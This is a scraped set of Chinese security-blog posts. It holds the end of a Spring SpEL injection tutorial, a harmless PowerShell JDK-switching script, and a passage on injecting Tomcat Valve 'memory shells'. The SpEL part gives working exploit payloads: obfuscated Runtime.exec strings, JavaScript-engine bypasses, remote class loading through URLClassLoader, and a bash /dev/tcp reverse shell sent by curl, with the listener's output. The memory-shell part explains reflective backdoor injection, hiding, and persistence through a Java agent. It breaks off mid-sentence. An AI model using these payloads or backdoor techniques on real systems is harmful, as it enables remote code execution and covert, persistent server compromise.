T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99))) 3.4.2 JavaScript Engine Bypass 使用 JS 引擎进行绕过\n获取所有 JS 引擎信息\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package com.src.JSBypass; import javax.script.ScriptEngineFactory; import javax.script.ScriptEngineManager; import java.util.List; public class demo1 { public static void main(String[] args) { ScriptEngineManager scriptEngineManager = new ScriptEngineManager(); List\u0026lt;ScriptEngineFactory\u0026gt; factories = scriptEngineManager.getEngineFactories(); for (ScriptEngineFactory factory : factories) { System.out.printf( \u0026#34;Name: %s%n\u0026#34; + \u0026#34;Version: %s%n\u0026#34; + \u0026#34;Language name: %s%n\u0026#34; + \u0026#34;Language version: %s%n\u0026#34; + \u0026#34;Extensions: %s%n\u0026#34; + \u0026#34;Mime types: %s%n\u0026#34; + \u0026#34;Names: %s%n\u0026#34;, factory.getEngineName(), factory.getEngineVersion(), factory.getLanguageName(), factory.getLanguageVersion(), factory.getExtensions(), factory.getMimeTypes(), factory.getNames() ); } } } 通过结果中的 Names，我们知道了所有的 js 引擎名称故 getEngineByName 的参数可以填 [nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript],举个例子:\njava\r1 2 3 ScriptEngineManager sem = new ScriptEngineManager(); ScriptEngine engine = sem.getEngineByName(\u0026#34;nashorn\u0026#34;); System.out.println(engine.eval(\u0026#34;2+1\u0026#34;)); payload:\njava\r1 2 3 4 5 6 7 8 9 10 // JavaScript引擎通用PoC T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\u0026#34;nashorn\u0026#34;).eval(\u0026#34;s=[3];s[0]=\u0026#39;cmd\u0026#39;;s[1]=\u0026#39;/C\u0026#39;;s[2]=\u0026#39;calc\u0026#39;;java.la\u0026#34;+\u0026#34;ng.Run\u0026#34;+\u0026#34;time.getRu\u0026#34;+\u0026#34;ntime().ex\u0026#34;+\u0026#34;ec(s);\u0026#34;) // JavaScript引擎+反射调用 T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\u0026#34;JavaScript\u0026#34;).eval(T(String).getClass().forName(\u0026#34;java.l\u0026#34;+\u0026#34;ang.Ru\u0026#34;+\u0026#34;ntime\u0026#34;).getMethod(\u0026#34;ex\u0026#34;+\u0026#34;ec\u0026#34;,T(String[])).invoke(T(String).getClass().forName(\u0026#34;java.l\u0026#34;+\u0026#34;ang.Ru\u0026#34;+\u0026#34;ntime\u0026#34;).getMethod(\u0026#34;getRu\u0026#34;+\u0026#34;ntime\u0026#34;).invoke(T(String).getClass().forName(\u0026#34;java.l\u0026#34;+\u0026#34;ang.Ru\u0026#34;+\u0026#34;ntime\u0026#34;)),new String[]{\u0026#34;cmd\u0026#34;,\u0026#34;/C\u0026#34;,\u0026#34;calc\u0026#34;})),) // JavaScript引擎+URL编码 // 其中URL编码内容为： // 不加最后的getInputStream()也行，因为弹计算器不需要回显 T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\u0026#34;JavaScript\u0026#34;).eval(T(java.net.URLDecoder).decode(\u0026#34;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\u0026#34;)),) java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.src.JSBypass; import org.springframework.expression.Expression; import org.springframework.expression.spel.standard.SpelExpressionParser; public class test1 { public static void main(String[] args) { //String spel = \u0026#34;T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\\\u0026#34;nashorn\\\u0026#34;).eval(\\\u0026#34;s=[3];s[0]=\u0026#39;cmd\u0026#39;;s[1]=\u0026#39;/C\u0026#39;;s[2]=\u0026#39;calc\u0026#39;;java.la\\\u0026#34;+\\\u0026#34;ng.Run\\\u0026#34;+\\\u0026#34;time.getRu\\\u0026#34;+\\\u0026#34;ntime().ex\\\u0026#34;+\\\u0026#34;ec(s);\\\u0026#34;)\\n\u0026#34;; //String spel = \u0026#34;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\\\u0026#34;JavaScript\\\u0026#34;).eval(T(String).getClass().forName(\\\u0026#34;java.l\\\u0026#34;+\\\u0026#34;ang.Ru\\\u0026#34;+\\\u0026#34;ntime\\\u0026#34;).getMethod(\\\u0026#34;ex\\\u0026#34;+\\\u0026#34;ec\\\u0026#34;,T(String[])).invoke(T(String).getClass().forName(\\\u0026#34;java.l\\\u0026#34;+\\\u0026#34;ang.Ru\\\u0026#34;+\\\u0026#34;ntime\\\u0026#34;).getMethod(\\\u0026#34;getRu\\\u0026#34;+\\\u0026#34;ntime\\\u0026#34;).invoke(T(String).getClass().forName(\\\u0026#34;java.l\\\u0026#34;+\\\u0026#34;ang.Ru\\\u0026#34;+\\\u0026#34;ntime\\\u0026#34;)),new String[]{\\\u0026#34;cmd\\\u0026#34;,\\\u0026#34;/C\\\u0026#34;,\\\u0026#34;calc\\\u0026#34;})),)\\n\u0026#34;; String spel = \u0026#34;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\\\u0026#34;JavaScript\\\u0026#34;).eval(T(java.net.URLDecoder).decode(\\\u0026#34;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\\\u0026#34;)),)\u0026#34;; SpelExpressionParser spelExpressionParser = new SpelExpressionParser(); Expression expression = spelExpressionParser.parseExpression(spel); System.out.println(expression.getValue()); } } 3.5 通过类加载器构造 PoC \u0026amp; Bypass 3.5.1 UrlClassloader 这个方法就是通过远程类加载\nWindons: 目标：现在有一个 Spring Boot 服务，它的 /eval?exp= 路径下可以进行 SpEL 表达式注入，我们要通过注入构造 URLClassLoader 来远程加载类 http://127.0.0.1:8999/Exp.jar 达到执行恶意类的目的\n1） 首先构造一个恶意类\n弹出计算器\njava\r1 2 3 4 5 6 7 8 9 public class Exp { public Exp(String p) { try { Runtime.getRuntime().exec(\u0026#34;cmd /c start calc.exe\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } } 2） 编译打包为 Exp.jar\ntext\r1 2 javac Exp.java jar cvf Exp.jar Exp.class 3） 用 python 本地启动 http 服务\ntext\r1 python -m http.server 8999 4） 准备 Spring Boot SpEL 漏洞 Demo\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package com.example.demo.urlClassloader; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; @SpringBootApplication public class DemoApplication { public static void main(String[] args) { SpringApplication.run(DemoApplication.class, args); } } package com.example.demo.urlClassloader; import org.springframework.expression.*; import org.springframework.expression.spel.standard.*; import org.springframework.web.bind.annotation.*; @RestController public class EvalController { @GetMapping(\u0026#34;/eval\u0026#34;) public String eval(@RequestParam String exp) { ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(exp); Object result = expression.getValue(); return String.valueOf(result); } } \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;com.test\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;demo\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0\u0026lt;/version\u0026gt; \u0026lt;packaging\u0026gt;jar\u0026lt;/packaging\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.3.12.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/project\u0026gt; 5）做完准备工作，我们就可以构造 payload 进行测试了\n原始 payload：\njava\r1 2 3 new java.net.URLClassLoader( new java.net.URL[]{new java.net.URL(\u0026#34;http://127.0.0.1:8999/Exp.jar\u0026#34;)} ).loadClass(\u0026#34;Exp\u0026#34;).getConstructors()[0].newInstance(\u0026#34;aaa\u0026#34;) 如果直接注入：\n内容就会被 Tomcat 拦截， 从 Tomcat 8.5+ / 9+ 开始， { } [ ] ( ) \u0026quot; . 这些字符如果未编码 会直接被拒绝。\n对 payload 进行 URL 编码：\njava\r1 2 3 new%20java.net.URLClassLoader( %20%20%20%20new%20java.net.URL%5B%5D%7Bnew%20java.net.URL(%22http%3A%2F%2F127.0.0.1%3A8999%2FExp.jar%22)%7D %20%20%20%20).loadClass(%22Exp%22).getConstructors()%5B0%5D.newInstance(%22aaa%22) 编码之后再进行注入，就可以弹出计算器了\nLinux: 1） 先准备恶意类并编译\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import java.io.IOException; public class Exp{ public Exp(String address){ address = address.replace(\u0026#34;:\u0026#34;,\u0026#34;/\u0026#34;); try { ProcessBuilder p = new ProcessBuilder( \u0026#34;/bin/bash\u0026#34;,\u0026#34;-c\u0026#34;, \u0026#34;exec 5\u0026lt;\u0026gt;/dev/tcp/\u0026#34; + address + \u0026#34;; cat \u0026lt;\u0026amp;5 | while read line; do $line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5; done\u0026#34; ); p.start(); } catch (IOException e) { e.printStackTrace(); } } } 2）借用 Windows 中写好的 SpringBoot 项目启动漏洞 Demo\ntext\r1 java -jar demo-1.0.jar 3）启动本地 http 服务\n4）nc 监听 2333 端口\n5）传入恶意 payload\ntext\r1 curl -G \u0026#34;http://127.0.0.1:8876/eval\u0026#34; --data-urlencode \u0026#39;exp=T(java.net.URLClassLoader).newInstance(new java.net.URL[]{new java.net.URL(\u0026#34;http://127.0.0.1:8999/Exp.jar\u0026#34;)}).loadClass(\u0026#34;Exp\u0026#34;).getConstructors()[0].newInstance(\u0026#34;127.0.0.1:2333\u0026#34;)\u0026#39; 6）\nconnect to [127.0.0.1] from localhost [127.0.0.1] 48096\n有一个进程从 本地（localhost） 使用随机端口 48096 连接到了监听端口 2333 如图，nc 已经获取到反弹 shell\n可以执行命令\n3.5.2 AppClassLoader 利用 SpEL，直接用 AppClassLoader 加载本地已经存在的 class，并调用里面的代码。无需远程 URL\n首先 T(java.lang.ClassLoader)获取 ClassLoader 类这个 Class 对象\nT(java.lang.ClassLoader).getSystemClassLoader()获取系统类加载器，即 AppClassLoader，接着加载AppClassLoader中的一个类loadClass('java.lang.Runtime')，调用getRuntime()执行命令exec('calc')。\nAppClassLoader和URLClassLoader的区别在于AppClassLoader加载的是本机 classpath 的类，本地攻击无需远程 URL；URLClassLoader可以加载任意 URL 的类，用于远程加载恶意类。\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package com.src.addClassLoader; import org.springframework.expression.Expression; import org.springframework.expression.ExpressionParser; import org.springframework.expression.spel.standard.SpelExpressionParser; import java.lang.reflect.InvocationTargetException; import java.net.MalformedURLException; public class demo1 { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException { String cmdStr = \u0026#34;T(java.lang.ClassLoader).getSystemClassLoader().loadClass(\u0026#39;java.lang.Runtime\u0026#39;).getRuntime().exec(\u0026#39;calc\u0026#39;)\u0026#34;; //创建解析器 ExpressionParser parser = new SpelExpressionParser(); //解析表达式 Expression exp = parser.parseExpression(cmdStr); //弹出计算器 System.out.println(exp.getValue()); } } 参考： SpEL（Spring表达语言）表达式详述：\nhttps://javacfox.github.io/2019/07/04/SpEL%EF%BC%88Spring%E8%A1%A8%E8%BE%BE%E8%AF%AD%E8%A8%80%EF%BC%89%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%A6%E8%BF%B0/\nSpEL表达式：\nhttps://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html\nhttps://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#%E9%80%9A%E8%BF%87-ClassLoader-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%9E%84%E9%80%A0-PoC-amp-Bypass\nhttp://101.36.122.13:4000/2025/03/25/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#H1gIO\n","permalink":"http://localhost:1313/xvsf/posts/spel-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/","summary":"\u003ch1 id=\"spel-表达式注入\"\u003eSpEL 表达式注入\u003c/h1\u003e\n\u003ch1 id=\"1spel-基础\"\u003e1、SpEL 基础\u003c/h1\u003e\n\u003ch2 id=\"11-简介\"\u003e1.1 简介\u003c/h2\u003e\n\u003cp\u003e在 Spring3 中引入了 Spring 表达式语言（Spring Expression Language，简称 SpEL），是一种强大的\u003cstrong\u003e运行时查询和操作对象图的语言\u003c/strong\u003e，语法类似于Jakarta表达语句，但额外支持方法调用和基本字符串模板。SpEL旨在为Spring社区提供一种统一且功能全面的表达式语言，适用于所有Spring产品，并根据这些产品的需要设计了其特性。尽管SpEL是Spring框架的一部分，但它可以独立于Spring使用。通常情况下，用户只需编写简单的表达式字符串即可利用SpEL的功能，无需关心底层架构细节。例如，在基于XML或注解的bean定义中集成SpEL就是一个常见应用。\u003c/p\u003e","title":"SpEL 表达式注入"},{"content":"Switch JDK versions in Windows 最近在安装工具时常常用到不同的 JDK 版本，而想要切换就得一条一条去修改环境变量，实在浪费时间。因此，通过 AI + 人工调试，终于推出了一款可以自动扫描已安装的所有 JDK 版本，并且快速切换的脚本。\n内容： text\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 # ----------------------------- # PowerShell 脚本：switchjdk.ps1 # 功能：在 Windows 下快速切换 Java 版本（自动检测 + 安全刷新） # 用法： PowerShell 管理员模式下直接执行：.\\switchjdk.ps1 # ----------------------------- # JDK 根目录（根据自己的 JDK 安装路径调整） $javaBase = \u0026#34;D:\\Java\u0026#34; Write-Host \u0026#34;`n==========================\u0026#34; -ForegroundColor Cyan Write-Host \u0026#34;🔍 扫描到已有的 Java JDK 版本：\u0026#34; -ForegroundColor Cyan Write-Host \u0026#34;==========================\u0026#34; -ForegroundColor Cyan # 获取所有 JDK 目录（按名称排序，防止索引错位） $jdkList = Get-ChildItem -Path $javaBase -Directory | Where-Object { $_.Name -match \u0026#34;^jdk\u0026#34; } | Sort-Object Name if (-not $jdkList) { Write-Host \u0026#34;❌ 未找到任何 JDK 版本，请检查目录：$javaBase\u0026#34; -ForegroundColor Red exit 1 } # 显示可选版本 $index = 1 foreach ($jdk in $jdkList) { Write-Host \u0026#34;$index. $($jdk.Name)\u0026#34; $index++ } # 获取当前 JAVA_HOME $currentJavaHome = [Environment]::GetEnvironmentVariable(\u0026#34;JAVA_HOME\u0026#34;, \u0026#34;Machine\u0026#34;) if ($currentJavaHome) { Write-Host \u0026#34;`n💡 当前版本为：$currentJavaHome\u0026#34; -ForegroundColor Yellow } else { Write-Host \u0026#34;`n⚠️ 当前系统未设置 JAVA_HOME\u0026#34; -ForegroundColor Yellow } # 提示用户选择版本 $choice = Read-Host \u0026#34;`n👉 请选择要更换的 JDK 序号（1-${jdkList.Count}）\u0026#34; if (-not ($choice -as [int]) -or $choice -lt 1 -or $choice -gt $jdkList.Count) { Write-Host \u0026#34;❌ 无效选择，操作已取消。\u0026#34; -ForegroundColor Red exit 1 } # 精确取选中版本 $selectedJdk = $jdkList | Sort-Object Name | Select-Object -Index ($choice - 1) $javaHome = $selectedJdk.FullName Write-Host \u0026#34;`n✅ 选择的 JDK：$javaHome\u0026#34; -ForegroundColor Green # 修改 JAVA_HOME（系统与用户级） [Environment]::SetEnvironmentVariable(\u0026#34;JAVA_HOME\u0026#34;, $javaHome, \u0026#34;User\u0026#34;) [Environment]::SetEnvironmentVariable(\u0026#34;JAVA_HOME\u0026#34;, $javaHome, \u0026#34;Machine\u0026#34;) Write-Host \u0026#34;✅ JAVA_HOME 已更新为 $javaHome\u0026#34; -ForegroundColor Green # 更新 Path：移除旧 JDK/bin，添加新 JDK/bin $oldPath = [Environment]::GetEnvironmentVariable(\u0026#34;Path\u0026#34;, \u0026#34;Machine\u0026#34;) $newPathParts = $oldPath -split \u0026#39;;\u0026#39; | Where-Object { ($_ -notmatch \u0026#34;Java\\\\jdk\u0026#34;) -and ($_ -notmatch \u0026#34;Java\\\\jre\u0026#34;) } $newPath = ($newPathParts + \u0026#34;$javaHome\\bin\u0026#34;) -join \u0026#39;;\u0026#39; [Environment]::SetEnvironmentVariable(\u0026#34;Path\u0026#34;, $newPath, \u0026#34;Machine\u0026#34;) Write-Host \u0026#34;🔁 系统 Path 已更新。\u0026#34; -ForegroundColor Yellow # 通知系统环境变量更新（立即生效） try { $signature = @\u0026#34; [DllImport(\u0026#34;user32.dll\u0026#34;, SetLastError=true, CharSet=CharSet.Auto)] public static extern IntPtr SendMessageTimeout( IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam, uint fuFlags, uint uTimeout, out UIntPtr lpdwResult); \u0026#34;@ Add-Type -MemberDefinition $signature -Name \u0026#34;NativeMethods\u0026#34; -Namespace \u0026#34;WinAPI\u0026#34; $HWND_BROADCAST = [IntPtr]0xffff $WM_SETTINGCHANGE = 0x1A $result = [UIntPtr]::Zero [void][WinAPI.NativeMethods]::SendMessageTimeout( $HWND_BROADCAST, $WM_SETTINGCHANGE, [UIntPtr]::Zero, \u0026#34;Environment\u0026#34;, 0, 1000, [ref]$result ) Write-Host \u0026#34;✅ System environment change broadcasted.\u0026#34; -ForegroundColor Green } catch { Write-Host \u0026#34;⚠️ Broadcast failed (但环境变量已更新)\u0026#34; -ForegroundColor Yellow } # 更新当前会话环境变量 $env:JAVA_HOME = $javaHome $env:Path = $newPath # ⚙️ 清除 PowerShell 命令缓存，确保生效新版本 try { if (Get-Command java -ErrorAction SilentlyContinue) { Remove-Item -Path Function:\\java -ErrorAction SilentlyContinue Remove-Item -Path Alias:\\java -ErrorAction SilentlyContinue } # 清除缓存路径 $env:Path = $newPath [System.Environment]::SetEnvironmentVariable(\u0026#34;Path\u0026#34;, $newPath, \u0026#34;Process\u0026#34;) # 强制重新定位 java 可执行路径 $null = \u0026amp; where.exe java } catch { Write-Host \u0026#34;⚠️ PowerShell 缓存刷新失败，但环境变量已更新\u0026#34; -ForegroundColor Yellow } Write-Host \u0026#34;`n==========================\u0026#34; -ForegroundColor Cyan Write-Host \u0026#34;Final check (java -version):\u0026#34; -ForegroundColor Cyan Write-Host \u0026#34;==========================\u0026#34; -ForegroundColor Cyan \u0026amp; java -version 使用： 首先将以上脚本内容进行保存，\n点击另存为\n一般来说保存到 JDK 的安装目录即可，保存类型为 所有文件(*.*) ，编码选择 UTF-8 BOM。\n最后保存\n先看一下我当前的 Java 版本吧：\n以管理员身份执行 PowerShell，切换到脚本所在目录\n执行**.\\switchjdk.ps1** ，就可以看到当前电脑安装的 JDK 版本啦。\n输入对应的序号进行切换：\n显示已切换，\n那么我们在另一个终端进行验证：\n可以看到成功切换到我们想要的 JDK 版本了~\n","permalink":"http://localhost:1313/xvsf/posts/switch-jdk-versions-in-windows/","summary":"\u003ch1 id=\"switch-jdk-versions-in-windows\"\u003eSwitch JDK versions in Windows\u003c/h1\u003e\n\u003cp\u003e最近在安装工具时常常用到不同的 JDK 版本，而想要切换就得一条一条去修改环境变量，实在浪费时间。因此，通过 AI + 人工调试，终于推出了一款可以自动扫描已安装的所有 JDK 版本，并且快速切换的脚本。\u003c/p\u003e","title":"Switch JDK versions in Windows"},{"content":"Java内存马——Tomcat Valve型的三种注入 转载自：https://www.freebuf.com/articles/web/433972.html\n核心原理 **Tomcat Pipeline \u0026amp; Valve：**Tomcat 使用责任链模式处理请求。Pipeline包含多个Valve，每个Valve负责特定任务（如认证、日志、访问控制）。StandardWrapperValve(通常位于链尾) 最终调用 Servlet。 **StandardContext：**代表一个 Web 应用，持有其对应的Pipeline对象 (StandardContext#getPipeline())。 **目标：**将恶意Valve注入到目标 Web 应用StandardContext的Pipeline中，通常是插入在StandardContextValve(负责应用级路由) 和StandardWrapperValve(负责调用 Servlet) 之间，或者尽可能靠前（如紧接在AccessLogValve之后）。恶意 Valve 的invoke()方法检查特定请求特征，匹配则执行命令并截断管道（不再调用getNext().invoke()），直接返回响应。 注入方式详解 方式一：纯反射注入（无依赖） 场景：攻击者已通过漏洞（如反序列化、文件上传 Webshell、其他 RCE）获得代码执行能力，但当前执行环境没有 Tomcat 的catalina.jar等库依赖（例如在Bootstrap ClassLoader或Common ClassLoader加载的类中执行）。这是最通用的方式。\n步骤：\n获取当前线程的ContextClassLoader(通常是WebappClassLoader):\ntext\r1 ClassLoader webappClassLoader = Thread.currentThread().getContextClassLoader(); 反射获取ApplicationContext(关键):\nTomcat 将ApplicationContext存储在WebappClassLoader的resources属性 (org.apache.catalina.webresources.StandardRoot) 的context属性中。 或者通过ClassLoader的resources属性获取WebResourceRoot，再反射获取其context属性。 text\r1 2 3 4 5 6 7 8 // 通过 WebappClassLoader 获取 resources (StandardRoot) Field resourcesField = webappClassLoader.getClass().getDeclaredField(\u0026#34;resources\u0026#34;); resourcesField.setAccessible(true); Object standardRoot = resourcesField.get(webappClassLoader); // 通过 StandardRoot 获取 Context (StandardContext) Field contextField = standardRoot.getClass().getDeclaredField(\u0026#34;context\u0026#34;); contextField.setAccessible(true); Object standardContext = contextField.get(standardRoot); // 这就是目标 StandardContext 反射获取Pipeline对象：\ntext\r1 2 Method getPipelineMethod = standardContext.getClass().getMethod(\u0026#34;getPipeline\u0026#34;); Object pipeline = getPipelineMethod.invoke(standardContext); 反射获取addValve方法：\ntext\r1 Method addValveMethod = pipeline.getClass().getMethod(\u0026#34;addValve\u0026#34;, Valve.class); 构造恶意 Valve 实例：\n将恶意 Valve 的字节码（编译后的.class文件内容）转换为byte[](可通过 Class 文件硬编码、远程加载、解码等方式)。 使用当前WebappClassLoader的defineClass方法（需反射调用）在内存中定义恶意 Valve 类。 text\r1 2 3 4 // 反射调用 protected final defineClass 方法 Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, String.class, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); Class evilValveClass = (Class) defineClassMethod.invoke(webappClassLoader, \u0026#34;com.evil.EvilValve\u0026#34;, evilValveBytecode, 0, evilValveBytecode.length); 实例化恶意 Valve： text\r1 Valve evilValve = (Valve) evilValveClass.newInstance(); 将恶意 Valve 注入 Pipeline：\ntext\r1 addValveMethod.invoke(pipeline, evilValve); 注入位置控制：Tomcat 的addValve默认加在末尾。要插入特定位置（如开头），需反射获取Pipeline的valves数组 (StandardPipeline#valves)，使用反射修改数组或调用addValve(Valve, int)(如果存在)。 **优点：**通用性强，不依赖 Tomcat API JAR。\n缺点：\n代码冗长，大量反射操作。 需要处理defineClass的调用（protected方法）。 依赖对 Tomcat 内部结构（WebappClassLoader.resources.context）的准确了解，不同 Tomcat 版本可能有差异。 注入的 Valve 类由WebappClassLoader加载，在堆内存中可见。 方式二：混合方式（利用 Tomcat API \u0026amp; 反射） 场景：攻击者获得的代码执行环境可以访问到 Tomcat 的内部 API（例如，攻击代码本身是由WebappClassLoader加载的，或者通过某些方式将catalina.jar加入了类路径）。常见于从已存在的 Filter/Servlet 型内存马或 JSP Webshell 中进行“二次注入”。\n步骤：\n获取StandardContext(更直接):\n通过ApplicationContext-\u0026gt;ServletContext的属性获取： text\r1 2 3 4 5 6 7 ServletContext servletContext = request.getServletContext(); // 如果有 request 对象 Field applicationContextField = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); applicationContextField.setAccessible(true); Object applicationContext = applicationContextField.get(servletContext); Field standardContextField = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); standardContextField.setAccessible(true); Object standardContext = standardContextField.get(applicationContext); 或者通过org.apache.catalina.core.ApplicationDispatcher的WRAP_SAME_OBJECT特性（如果启用）获取lastServicedRequest/lastServicedResponse中的Context(较复杂)。 **获取Pipeline对象：**同方式一。\n构造恶意 Valve 实例：\n**方式 A (ClassLoader 注入)：**同方式一步骤 5，使用WebappClassLoader.defineClass。 **方式 B (直接实例化 - 更优)：**如果能直接访问到恶意 Valve 的类定义（例如，恶意 Valve 类字节码已通过其他方式加载，或者攻击代码直接包含了这个类），可以直接new： text\r1 Valve evilValve = new com.evil.EvilValve(); // 需要 EvilValve 类在当前 ClassLoader 可见 **注入 Valve：**直接调用StandardPipeline.addValve()方法：\ntext\r1 ((StandardPipeline) pipeline).addValve(evilValve); 同样可以通过反射操作valves数组控制注入位置。 优点：\n代码相对简洁清晰（减少了反射）。 效率更高。 缺点：\n依赖 Tomcat API 环境（需要org.apache.catalina.*类可见）。 如果采用方式 B 构造实例，需要解决如何让EvilValve类被加载的问题（可能仍需defineClass或依赖其他已加载的恶意类）。 方式三：Java Agent + ASM/Javassist 字节码注入（终极隐蔽） 场景：攻击者具备更高权限（如上传 Agent JAR 或利用 Attach API 注入 Agent），追求极致的隐蔽性。目标是不创建新的 Valve 类，而是将恶意逻辑直接编织进 Tomcat 核心类（如StandardPipeline或某个关键 Valve）的字节码中。\n步骤：\n**注入 Agent：**通过-javaagent启动参数、VirtualMachine.attach()API 或利用已知漏洞加载恶意 Agent Jar。\n**实现ClassFileTransformer：**在 Agent 中注册自定义的ClassFileTransformer。\n**定位并修改目标类：**在transform()方法中，识别目标类（例如org.apache.catalina.core.StandardPipeline）：\ntext\r1 2 3 if (\u0026#34;org.apache.catalina.core.StandardPipeline\u0026#34;.equals(className)) { // 使用 ASM 或 Javassist 修改字节码 } 修改addValve或invoke逻辑 (策略)：\n**策略 A (劫持invoke):**修改StandardPipeline的invoke()方法。在方法内部遍历valves数组之前或某个关键节点（如调用StandardContextValve.invoke()前），插入恶意逻辑：检查请求特征，匹配则执行命令、构造响应并返回（跳过后续 Valve）。 **策略 B (伪装成现有 Valve):**修改某个不常用或非关键的现有 Valve 类（如StandardContextValve或AccessLogValve）的invoke()方法。在其原有逻辑的开头或结尾插入恶意检查逻辑。 **策略 C (创建“幽灵”Valve):**修改StandardPipeline的addValve()方法。使其在特定条件下（例如，添加的 Valve 类名匹配某个特殊模式或 hash）不真正添加该 Valve，而是将其保存到一个隐藏的列表中。同时修改invoke()方法，使其在调用官方valves数组前后，也遍历并调用这个隐藏列表中的“幽灵” Valve。这种方式极其隐蔽，因为常规的Pipeline.valves数组中看不到恶意 Valve。 **字节码操作：**使用 ASM/Javassist 库插入恶意字节码。恶意逻辑通常包含：\n从Request对象获取参数/头/路径。 与预设密码比较。 调用Runtime.exec()或ProcessBuilder执行命令。 读取执行结果，写入Response输出流。 根据是否匹配密码，决定是否继续调用原始管道逻辑 (getNext().invoke()）。 优点：\n**终极隐蔽性：**没有新的可疑类 (EvilValve) 被定义和加载。恶意逻辑“溶解”在 Tomcat 官方核心类中。 不依赖WebappClassLoader，应用重启后只要 Agent 仍在就有效（持久化能力强）。 极难通过常规内存 dump 分析发现（需要逐类反编译校验）。 缺点：\n实现难度极高，需要深入理解 JVM 字节码和 Tomcat 内部流程。 需要获取 Agent 注入的权限（通常意味着已有较高权限）。 不同 Tomcat 版本的核心类字节码差异较大，需要为不同版本定制或做兼容。 Agent 本身的存在可能被检测（JVM 参数、VirtualMachine.list()）。 纯反射注入 一、核心原理与目标 目标：在不引入Tomcat API依赖（catalina.jar等）的情况下，通过纯反射操作： 获取当前Web应用的StandardContext（Tomcat核心容器对象） 定位其Pipeline（请求处理管道） 动态注入恶意Valve实例到管道中 技术挑战： 绕过类加载器隔离（从非Web类加载器访问Web层对象） 通过反射链破解Tomcat内部数据结构 内存中定义恶意Valve类（无磁盘文件） 二、注入流程详解 步骤1：获取WebappClassLoader text\r1 ClassLoader webappClassLoader = Thread.currentThread().getContextClassLoader(); 原理：Tomcat为每个Web应用创建独立的WebappClassLoader，当前线程的ClassLoader通常就是它。 注意：在非请求线程（如反序列化触发的线程）中需遍历线程组定位。 步骤2：反射获取StandardContext 这是最核心的步骤，需穿透两层隐藏引用：\ntext\r1 2 3 